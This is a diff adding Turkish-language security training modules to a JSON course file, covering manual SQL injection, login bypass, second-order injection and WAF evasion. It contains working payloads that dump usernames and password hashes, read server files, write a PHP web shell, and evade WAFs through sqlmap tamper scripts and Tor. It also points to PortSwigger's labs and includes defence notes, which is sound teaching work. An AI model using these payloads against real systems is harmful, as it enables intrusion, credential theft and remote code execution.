@@ -191,6 +191,213 @@
           }
         }
       ]
+    },
+    {
+      "id": "manuel-sqli",
+      "title": "Manuel SQLi — SQLMap Çalıştırmadan Önce Elle Anla",
+      "description": "Otomasyon öncesi temel: hata mesajları, UNION, boolean ve time-based teknikleri elle uygulamayı öğren.",
+      "difficulty": "intermediate",
+      "duration": "70 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Neden Manuel Öğrenmek Zorunlu?",
+          "content": "SQLMap her şeyi otomatize eder ama **şunu bilemez:** hangi parametrenin gerçekten zafiyetli olduğunu sezgiyle tespit etmeyi. Manuel SQLi öğrenirsen:\n\n- WAF'ın ne engellediğini anlarsın → doğru tamper seçersin\n- Blind SQLi'yi saatler yerine dakikalarda tanırsın\n- SQLMap çıktısını yorumlayabilirsin (ne yapıyor, neden?)\n- OSCE/OSCP gibi sertifikalarda otomasyon yasak — elle yapman gerekiyor\n\n**Temel mantık:**\n```\nSELECT * FROM users WHERE id='[GİRDİ]';\n                              ↑\n          Kullanıcı girişi buraya ekleniyor\n```\nGirdi: `1' OR '1'='1`\nSorgu: `SELECT * FROM users WHERE id='1' OR '1'='1'`\n→ Her zaman true → tüm kayıtlar döner"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Error-Based Manuel Payloadlar",
+          "commands": [
+            {
+              "command": "' -- -",
+              "description": "Temel SQLi test — hata mesajı gelirse zafiyet var",
+              "tip": "MySQL: 'You have an error in your SQL syntax' → zafiyet doğrulandı. MSSQL: 'Unclosed quotation mark' → farklı syntax gerekir."
+            },
+            {
+              "command": "1' ORDER BY 1-- -",
+              "description": "Sütun sayısını bul — ORDER BY 1, 2, 3... hata verene kadar artır",
+              "tip": "ORDER BY 4 hata verdiyse → 3 sütun var. Bu bilgi UNION saldırısı için şart."
+            },
+            {
+              "command": "1' UNION SELECT NULL,NULL,NULL-- -",
+              "description": "UNION ile sütun sayısını doğrula — NULL sayısı = sütun sayısı",
+              "tip": "NULL kullan çünkü her veri tipine uyumludur. Sonraki adım: hangi sütun görünür?"
+            },
+            {
+              "command": "1' UNION SELECT 'a',NULL,NULL-- -",
+              "description": "Görünür sütunu bul — 'a' string'i sayfada çıkıyor mu?",
+              "tip": "Her sütun için dene: 1. sütun, 2. sütun... Ekranda 'a' gördüğün sütun veri çıkarmak için kullanılacak."
+            },
+            {
+              "command": "1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
+              "description": "Mevcut DB'deki tabloları çek",
+              "tip": "Bu payload MySQL içindir. MSSQL için: sys.tables. PostgreSQL için: information_schema.tables aynı."
+            },
+            {
+              "command": "1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -",
+              "description": "users tablosunun sütunlarını çek",
+              "tip": "Sütun isimlerini öğrendikten sonra: UNION SELECT username,password,NULL FROM users-- -"
+            },
+            {
+              "command": "1' UNION SELECT username,password,NULL FROM users-- -",
+              "description": "Kullanıcı adı ve şifre hash'lerini çek",
+              "tip": "Hash türünü tanı: 32 karakter → MD5, 40 karakter → SHA1, $2y$ ile başlıyorsa → bcrypt"
+            }
+          ]
+        },
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Boolean-Based Blind SQLi (Hata Yok, Ama Cevap Farklı)",
+          "content": "Hata mesajı görmüyorsun ama sayfa içeriği değişiyor:\n\n```\n?id=1 → Kullanıcı profili gösteriyor\n?id=1 AND 1=1-- - → Aynı sonuç (true)\n?id=1 AND 1=2-- - → Boş sayfa (false)\n```\n\nBu pattern → Boolean-based blind SQLi var!\n\n**Veri çekme — karakteri karakter:**\n```sql\n-- Kullanıcı adının 1. karakteri 'a' mı?\n?id=1 AND SUBSTRING(username,1,1)='a'-- -\n\n-- Veritabanı adının uzunluğu 6 mı?\n?id=1 AND LENGTH(database())=6-- -\n\n-- Karakter aralığı binary search:\n?id=1 AND ASCII(SUBSTRING(database(),1,1))>77-- -\n```\n\nBu işlemi elle yapmak çok yavaş → SQLMap'in yaptığı tam olarak bu.\nAnca **ne yaptığını anlamak için** en az bir kez elle dene."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Time-Based Blind SQLi (Görünür Fark Yok)",
+          "commands": [
+            {
+              "command": "?id=1' AND SLEEP(5)-- -",
+              "description": "MySQL — 5 saniye gecikme olursa blind SQLi var",
+              "tip": "Burp Repeater'da gönder, response time'a bak. 5 saniye gecikme → zafiyet doğrulandı."
+            },
+            {
+              "command": "?id=1'; WAITFOR DELAY '0:0:5'-- -",
+              "description": "MSSQL time-based — SLEEP yerine WAITFOR DELAY",
+              "tip": "MSSQL'de SLEEP() çalışmaz. pg_sleep(5) PostgreSQL için."
+            },
+            {
+              "command": "?id=1' AND IF(1=1,SLEEP(5),0)-- -",
+              "description": "Koşullu gecikme — sadece koşul true ise bekler",
+              "tip": "Boolean + time kombinasyonu: IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(3),0) → 'a' harfini sorgula"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "auth-bypass",
+      "title": "Authentication Bypass & İkinci Derece SQLi",
+      "description": "Login formunu SQLi ile aşma, second-order injection ve SQLi'den dosya okuma/yazma.",
+      "difficulty": "advanced",
+      "duration": "60 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Login Bypass — Giriş Formunu Atlatma",
+          "content": "Login formu:\n```sql\nSELECT * FROM users WHERE username='[USER]' AND password='[PASS]'\n```\n\n**Klasik bypass payloadları:**\n```\nKullanıcı adı: admin'-- -\nŞifre: (herhangi bir şey)\n\nSorgu: SELECT * FROM users WHERE username='admin'-- -' AND password='...' \n→ -- - sonrası yorum satırı → şifre kontrolü atlanır!\n```\n\nDiğer payloadlar:\n```\n' OR '1'='1'-- -        → Tüm kullanıcılar\nadmin'#                  → MySQL yorum karakteri\nadmin' OR 1=1-- -        → Her zaman true\n' OR 1=1 LIMIT 1-- -    → İlk kullanıcı olarak giriş\n```\n\n**MSSQL bypass:**\n```\nadmin'--\n' OR 1=1--\n```\n\n**Defense:** Prepared statement kullan:\n```php\n// YANLIŞ:\n$query = \"SELECT * FROM users WHERE user='$username'\";\n\n// DOĞRU (PDO):\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE user=?\");\n$stmt->execute([$username]);\n```"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "SQLi → Dosya Okuma ve Yazma",
+          "commands": [
+            {
+              "command": "1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -",
+              "description": "MySQL LOAD_FILE — sunucu dosyası oku (FILE yetkisi gerekli)",
+              "tip": "Başarılıysa /etc/passwd içeriği sayfada çıkar. Sonra: /var/www/html/config.php → DB şifresi!"
+            },
+            {
+              "command": "1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -",
+              "description": "Web shell yaz — FILE yetkisi + web dizinine yazma izni gerekli",
+              "tip": "Başarılıysa http://IP/shell.php?cmd=whoami → RCE! Çalışmazsa: Apache'nin document root'u nerede? /var/www/html yerine /var/www/ veya /srv/http/ olabilir."
+            },
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --file-read='/etc/passwd'",
+              "description": "SQLMap ile dosya okuma — LOAD_FILE'ı otomatize eder"
+            },
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
+              "description": "SQLMap ile web shell yaz"
+            }
+          ]
+        },
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Second-Order SQLi (Depolanmış SQLi)",
+          "content": "Normal SQLi: girdi hemen sorguya giriyor.\n**Second-order:** Girdi önce veritabanına kaydediliyor, sonraki işlemde kullanılıyor.\n\n**Örnek senaryo:**\n```\n1. Kayıt ol → Username: admin'-- -\n2. Kayıt başarılı (girdi sanitize edildi, temiz kaydedildi)\n3. Profil güncelle → Backend:\n   UPDATE users SET password='yeni' WHERE username='admin'-- -'\n4. -- - sonrası yorum → WHERE kısmı atlanır → TÜM kullanıcıların şifresi değişti!\n```\n\n**Neden zor tespit edilir?**\n- Kayıt sırasında zafiyet görünmez\n- Test eden kişi sadece anlık tepkiye bakar\n- SQLMap genellikle bunu kaçırır (manuel test şart!)\n\n**Nasıl test edersin:**\n```\n1. Her input alanına: test'-- - , test\", test'OR'1'='1\n2. Bu değerleri KAYDEDEN uygulamaları bul (kayıt, profil, yorum)\n3. Kaydedilen değerin başka bir işlemde nasıl kullanıldığını izle\n4. Sorgu oluşturan her noktada zafiyet var mı kontrol et\n```\n\n**Defense:** Her okuma-yazma noktasında ayrı ayrı prepared statement kullan. Sadece kullanıcı giriş noktasında değil, veritabanından veri çekip yeniden kullanan her yerde."
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "Lab: PortSwigger Web Security Academy",
+          "scenario": {
+            "title": "SQLi Lab Sıralaması — Ücretsiz Online Lab",
+            "objective": "PortSwigger'ın ücretsiz SQLi lab'larıyla pratik yap — her modül bir konuya odaklanıyor.",
+            "environment": "portswigger.net/web-security/sql-injection — ücretsiz hesap aç",
+            "difficulty": "beginner-to-advanced",
+            "steps": [
+              "portswigger.net/web-security/sql-injection adresine git",
+              "Temel: 'SQL injection vulnerability in WHERE clause' → UNION saldırısı",
+              "Orta: 'SQL injection UNION attack, determining the number of columns' → ORDER BY tekniği",
+              "İleri: 'Blind SQL injection with time delays' → SLEEP() ile data exfiltration",
+              "Her lab için: önce elle dene, sonra SQLMap ile karşılaştır"
+            ],
+            "hints": [
+              "UNION saldırısında önce sütun sayısını bul (ORDER BY)",
+              "NULL kullan UNION'da — type mismatch olmaz",
+              "Blind'da binary search mantığı: ASCII > 77 mi? Evet → ASCII > 110 mu? ..."
+            ],
+            "flag": "Sayfada 'Congratulations, you solved the lab!' mesajı",
+            "defenseNote": "Defense: Her DB sorgusu için parameterized query. ORM kullan. DB kullanıcısına SELECT dışında yetki verme. FILE, INTO OUTFILE, xp_cmdshell kapat. WAF ekle ama tek savunma olarak güvenme."
+          }
+        }
+      ]
+    },
+    {
+      "id": "waf-bypass-ileri",
+      "title": "WAF Bypass — İleri Teknikler",
+      "description": "Web Application Firewall'ı tespit et, parmak izi al ve payload'ı gizle.",
+      "difficulty": "advanced",
+      "duration": "50 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "WAF Tespiti ve Parmak İzi",
+          "content": "WAF aktif olduğunu nasıl anlarsın?\n\n```\n# Basit SQLi payload gönder:\n?id=1' OR '1'='1\n\n# WAF varsa:\n→ 403 Forbidden\n→ 'Request blocked by security policy'\n→ Cloudflare/Akamai sayfası\n→ Beklenmeden yüksek response time\n```\n\n**WAF türleri:**\n- **Cloudflare** → Response header'da `cf-ray` var\n- **ModSecurity** → Hata mesajında 'ModSecurity' veya '406 Not Acceptable'\n- **AWS WAF** → X-Amzn-RequestId header\n- **F5 BIG-IP** → TS cookie başlığı\n\n```bash\n# WAFw00f ile otomatik tespit\nwafwoof http://target.com\n\n# Manuel tespit\ncurl -I http://target.com/?id=1' | grep -i 'server\\|via\\|x-'\n```"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "WAF Bypass Tamper Scriptleri",
+          "commands": [
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --tamper=space2comment --dbs",
+              "description": "Boşlukları /**/ ile değiştir — en basit bypass",
+              "tip": "SELECT/**/username/**/FROM/**/users → kelimeler arasına yorum ekler"
+            },
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --tamper=randomcase --dbs",
+              "description": "Büyük/küçük harf rastgeleleştir — case-sensitive WAF atlatma",
+              "tip": "SeLeCt UsErNaMe FrOm UsErS → bazı WAF'lar küçük/büyük harf karışımını kaçırır"
+            },
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --tamper=space2comment,randomcase,between --dbs",
+              "description": "Kombine tamper — birden fazla bypass tekniğini birleştir"
+            },
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --tamper=charencode --dbs",
+              "description": "URL encode — %27 yerine %2527 (double encode)",
+              "tip": "WAF %27 decode eder, uygulama %2527'yi tekrar decode eder → ' karakteri gelir"
+            },
+            {
+              "command": "sqlmap -u 'http://IP/page.php?id=1' --delay=2 --random-agent --tor --dbs",
+              "description": "Rate limiting bypass — gecikme + random agent + Tor üzerinden"
+            }
+          ]
+        },
+        {
+          "id": "advanced",
+          "type": "advanced",
+          "title": "Manuel WAF Bypass Teknikleri",
+          "content": "```sql\n-- Boşluk yerine alternatifler:\nSELECT%09username%09FROM%09users  -- Tab\nSELECT\\nusername\\nFROM\\nusers    -- Newline\nSELECT/**/username/**/FROM/**/users -- Yorum\n\n-- Keyword gizleme:\nSELeCT → SeLeCt\nUNION → UNiOn\nSELECT → SEL/**/ECT\n\n-- Hex encoding:\n' → 0x27\nOR → 0x4f52\nSELECT 'a' → SELECT 0x61\n\n-- Inline yorum:\nSELECT /*!50000username*/ FROM users\n-- MySQL versiyona göre conditional comment\n\n-- HPP (HTTP Parameter Pollution):\n?id=1&id=UNION SELECT...\n-- Bazı WAF'lar sadece ilk parametreye bakar\n\n-- Noktalı virgül ile stacked:\n1; SELECT SLEEP(5)-- -\n-- WAF tek sorgu bekliyorsa kaçırabilir\n```\n\n**Defense:** WAF kurallarını düzenli güncelle. Sadece blacklist değil, whitelist kuralları ekle. Rate limiting. Anomali tabanlı algılama (Mod Security CRS)."
+        }
+      ]
     }
   ]
 }
